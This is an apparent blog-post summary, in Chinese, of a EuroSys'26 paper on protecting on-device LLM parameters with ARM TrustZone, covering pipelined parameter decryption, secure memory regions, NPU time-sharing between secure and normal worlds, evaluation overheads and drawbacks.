TrustZone</h1><p><img src=\"/images/JFbabXzZUoOVKSxD8qtcrRNnn1d.png\" title=\"image\"></p>\n<p>EuroSys‘26</p>\n<h2 id=\"Background\"><a href=\"#Background\" class=\"headerlink\" title=\"Background\"></a>Background</h2><p>现代移动应用能够自动将用户数据整合到大语言模型的提示中，以生成个性化的响应。与使用云端系统不同，当前出现了一种日益增长的趋势，即将 LLM 推理任务直接部署在移动设备上运行，因为这样做可以消除查询云服务所带来的网络延迟，并将用户的私有数据保留在其本地设备上。</p>\n<p>然而，在移动设备上存储 LLM 模型参数也带来了专有模型泄露给不可信用户的风险，因为移动设备容易遭受越狱攻击。模型泄露可能给模型提供方造成重大经济损失，因为此类模型的开发成本可能高达数百万美元。此外，泄露还可能严重削弱模型提供方在竞争激烈的大语言模型市场中的竞争优势。</p>\n<p>根据先前的研究，大多数移动应用对其设备端模型完全未加保护，而其他一些应用虽然对模型文件进行了加密，但仍允许攻击者从内存中提取出明文形式的模型参数。</p>\n<p><img src=\"/images/WMXJba05poqw4Xx16PZc8n8unRc.png\" title=\"image\"></p>\n<h2 id=\"Challenge\"><a href=\"#Challenge\" class=\"headerlink\" title=\"Challenge\"></a>Challenge</h2><h3 id=\"Memory\"><a href=\"#Memory\" class=\"headerlink\" title=\"Memory\"></a>Memory</h3><p>存在 Memory efficiency 和 fast inference 的 trade off</p>\n<p>大模型推理需要内存太大，如果动态扩缩容，就会面临冷启动的问题。</p>\n<p><img src=\"/images/PQCHbDGyCoVOU5x95mncnzTWnOh.png\" title=\"image\"></p>\n<h3 id=\"NPU\"><a href=\"#NPU\" class=\"headerlink\" title=\"NPU\"></a>NPU</h3><p>REE&#x2F;TEE 缺少安全 NPU 共享的方案</p>\n<ul>\n<li>NPU 在启动时默认配置为非安全设备</li>\n<li>Rockchip NPU 将 llama3-8B 模型的 prefill 提高 12.5 倍 decode 提高 1.3 倍</li>\n<li>使用两个驱动，REE&#x2F;TEE 中 detach&#x2F;attach 进行完整的切换，一次需要 32ms 太慢</li>\n</ul>\n<h2 id=\"Design\"><a href=\"#Design\" class=\"headerlink\" title=\"Design\"></a>Design</h2><p><img src=\"/images/PR1PbxK2Hodqymx9tMbcxsGvn0d.png\" title=\"image\"></p>\n<ul>\n<li>TA：llama.cpp</li>\n<li>REE OS:OpenHarmony v4.1 with Linux v5.10</li>\n<li>TEE OS: OpenHarmony OS and chcore</li>\n</ul>\n<h3 id=\"Pipelined-Parameter-Restoration\"><a href=\"#Pipelined-Parameter-Restoration\" class=\"headerlink\" title=\"Pipelined Parameter Restoration\"></a>Pipelined Parameter Restoration</h3><p><img src=\"/images/OXqEbd8QYoZn6GxZocVcQrgCnBh.png\" title=\"image\"></p>\n<p>相对于传统的纯计算操作，额外增加了三个算子</p>\n<ul>\n<li>Allocation  (CPU)</li>\n<li>Loading (IO)</li>\n<li>Decryption (CPU)</li>\n</ul>\n<p>优先级调度策略：</p>\n<ol>\n<li>Computation</li>\n<li>Decryption</li>\n<li>Allocation</li>\n<li>Loading</li>\n</ol>\n<p>允许 CPU 抢占</p>\n<h3 id=\"Pipeline-Aware-Secure-Memory-Management\"><a href=\"#Pipeline-Aware-Secure-Memory-Management\" class=\"headerlink\" title=\"Pipeline-Aware Secure Memory Management\"></a>Pipeline-Aware Secure Memory Management</h3><p><img src=\"/images/LipqbNh6PomMTLxK6X1cWLZQnze.png\" title=\"image\"></p>\n<p>两个 TZASC region：</p>\n<ul>\n<li>LLM 参数</li>\n<li>KV cache, activations,and other data</li>\n</ul>\n<p>通过 CMA 实现连续内存获取</p>\n<h3 id=\"TEE-REE-NPU-Time-Sharing\"><a href=\"#TEE-REE-NPU-Time-Sharing\" class=\"headerlink\" title=\"TEE-REE NPU Time-Sharing\"></a>TEE-REE NPU Time-Sharing</h3><p><img src=\"/images/IIpFb7yIzo37C3xNviPcHF5UnTc.png\" title=\"image\"></p>\n<p>Data plane 负责：</p>\n<ol>\n<li>初始化 job 上下文，包括 IOPT 内存  register buffer 等</li>\n<li>MMIO 提交 job 到硬件</li>\n<li>处理中断</li>\n</ol>\n<p>Control plane 负责：</p>\n<ol>\n<li>提交 job 到软件队列</li>\n<li>调度 job</li>\n<li>通过 data plane 提交 job 到硬件</li>\n<li>调度下一个 job</li>\n</ol>\n<p><img src=\"/images/BTVdb3oc3oXxVuxZ9CPcW1N1nte.png\" title=\"image\"></p>\n<ul>\n<li>REE kernel 中放完整的 NPU driver  包括调度功能</li>\n<li>TEE 中放部分 NPU driver 只有构造 job 和提交 job 到硬件</li>\n</ul>\n<p>NPU multiplexing 实现：</p>\n<ol>\n<li>TA 有一个乘法任务 提交到 TEE NPU driver</li>\n<li>TEE NPU driver 构造一个 secure job 通过 tzdriver （smc）通知 REE NPU driver</li>\n<li>REE NPU driver 把这个 secure job 加入调度队列</li>\n<li>REE NPU driver 进行正常的调度和计算</li>\n<li>REE NPU driver 调度到一个 secure job</li>\n<li>通过 tzdriver 控制流返回到 TEE NPU driver</li>\n<li>TEE NPU driver 配置 TZPC TZASC GIC 把 NPU 切换为 secure mode</li>\n<li>TEE NPU driver 通过 MMIO 提交 secure job 到硬件</li>\n<li>TEE NPU driver 等待任务完成 配置 TZPC TZASC GIC  把 NPU 切换为 normal mode</li>\n</ol>\n<h2 id=\"Evaluation\"><a href=\"#Evaluation\" class=\"headerlink\" title=\"Evaluation\"></a>Evaluation</h2><ol>\n<li>TTFT</li>\n</ol>\n<p><img src=\"/images/C2zBbCyTto4eNWxveEZceAUmnUg.png\" title=\"image\"></p>\n<ul>\n<li>Strawmen baseline: 77.1%-91.1% improvement</li>\n<li>REE-Flash baseline：2.5%∼22.3%, 22.2%∼55.3%, 10.2%∼15.2% overhead</li>\n<li>REE-Memory baseline: up to 8.5× overhead (parameter restoration)</li>\n</ul>\n<p><img src=\"/images/AUfFbo6jLoq6XcxkPTScNJb2nJb.png\" title=\"image\"></p>\n<p>prompt 短的情况下 overhead 非常明显</p>\n<ol>\n<li>Decode</li>\n</ol>\n<p><img src=\"/images/Q6LjbvcBvoTXv0x4vgUcCZdenPe.png\" title=\"image\"></p>\n<ul>\n<li>Straewman baseline: 0.9%∼23.2% improvement</li>\n<li>REE baseline:1.3%∼4.9% overhead (NPU multiplexing)</li>\n</ul>\n<ol>\n<li>NPU</li>\n</ol>\n<p><img src=\"/images/HoN7bYhOToAG30x60wvc1LhInSh.png\" title=\"image\"></p>\n<ul>\n<li>额外 3.8% and 3.0% 的 overhead</li>\n<li>smc switch + TZASC TZPC 配置 +GIC 配置耗时在 prefill decode 阶段占比为 1.6%∼2.7% and 2.3%∼5.7%</li>\n</ul>\n<h2 id=\"Drawback\"><a href=\"#Drawback\" class=\"headerlink\" title=\"Drawback\"></a>Drawback</h2><p>Secure memory 需要 CMA 分配连续内存</p>\n<ol>\n<li>耗时久</li>\n</ol>\n<p><img src=\"/images/LGSDb8n3Ro3oJYxNN04cw9aanvg.png\" title=\"image\"></p>\n<p><img src=\"/images/Et40bJ5YrorZ66xA18XckcyGnZd.png\" title=\"image\"></p>\n<p><img src=\"/images/RJuXbsvzgodRxpxynHPcQHUonU9.png\" title=\"image\"></p>\n<ol>\n<li>影响其他应用性能</li>\n</ol>\n<p><img src=\"/images/BwF8bx6zFoYduvxeTJEcktHDnud.png\" title=\"image\"></p>\n<ol>\n<li>需要改 EL3</li>\n</ol>\n","categories":["papers"]}]